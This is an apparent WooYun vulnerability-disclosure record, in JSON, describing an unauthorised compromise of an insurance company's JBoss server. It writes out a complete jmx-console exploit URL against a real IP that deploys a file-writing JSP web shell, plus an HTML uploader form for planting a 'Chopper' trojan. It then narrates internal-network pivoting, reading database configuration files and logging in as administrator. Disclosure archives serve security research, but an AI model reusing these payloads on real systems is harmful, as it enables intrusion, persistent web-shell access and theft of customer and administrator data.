{"id": 46667, "wybug_id": "wooyun-2015-089344", "wybug_title": "安盛天平财险某平台系统可被GetShell(可漫游内网)", "wybug_corp": "安盛天平财产保险股份有限公司", "wybug_author": "Blunber", "wybug_date": "2015-01-04 14:46", "wybug_open_date": "2015-02-18 14:48", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "逻辑错误", "敏感接口未加权限认证", "安全意识不足", "越权操作", "未授权访问", "用户敏感信息泄露", "后台被猜解", "认证设计不合理", "平行权限"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-02-18：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 安盛天平财产保险股份有限公司正式成立为当前中国保险市场上最大的外资财险公司。[1]安盛强化了其在中国直销领域及高增长市场的地位，与集团整体发展战略一致。安盛在全球财险方面的专业经验和雄厚实力，将有助于天平车险进一步发展成熟的直销渠道。天平作为中国第一家专业汽车保险公司和首批获得直销牌照的保险公司，使安盛在迅速发展的中国财险市场取得了领先的国内直销渠道及广泛覆盖全国的服务网络。。。请原谅我的手贱。。。 详细说明：  1、发现同段有jboss\n\n2、于是上传个本地war包\nhttp://180.168.192.54/jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=java.lang.String&arg0=upload5warn.war&argType=java.lang.String&&arg1=shell&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=%3c%25+if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b+%25%3e&argType=boolean&arg4=True\n发现轻松无拦截\nhttp://180.168.192.54/upload5warn/shell.jsp\n通过构造html，导入菜刀马。\n<html><head><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"><title>jsp-test</title></head><style>.main{width:980px;height:600px;margin:0 auto;}.url{width:300px;}.fn{width:60px;}.content{width:80%;height:60%;}</style><script>  function upload(){    var url = document.getElementById('url').value,      content = document.getElementById('content').value,      fileName = document.getElementById('fn').value,      form = document.getElementById('fm');    if(url.length == 0){      alert(\"Url not allowd empty!\");      return ;    }    if(content.length == 0){      alert(\"Content not allowd empty!\");      return ;    }    if(fileName.length == 0){      alert(\"FileName not allowd empty!\");      return ;    }    form.action = url;    form.submit();  }</script><body><div class=\"main\">  <form id=\"fm\" method=\"post\">      URL:<input type=\"text\" value=\"http://url/upload5warn/shell.jsp\" class=\"url\" id=\"url\" />      FileName:<input type=\"text\" name=\"f\" value=\"css.jsp\" class=\"fn\" id=\"fn\" />      <a href=\"javascript:upload();\">Upload</a><br/>    <textarea id=\"content\" class=\"content\" name=\"t\" ></textarea>  </form></div></body></html>\n连接菜刀\n\n用户权限\n\nping 主站地址，可判断都在同一内网中。\n\n   漏洞证明：  找到本地登录系统，我惊了。\n\n于是找了找数据库配置文件\n\n找到管理员配置信息，并登陆系统\n\n\n\n   修复方案：  我不知道   版权声明：转载请注明来源 Blunber@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}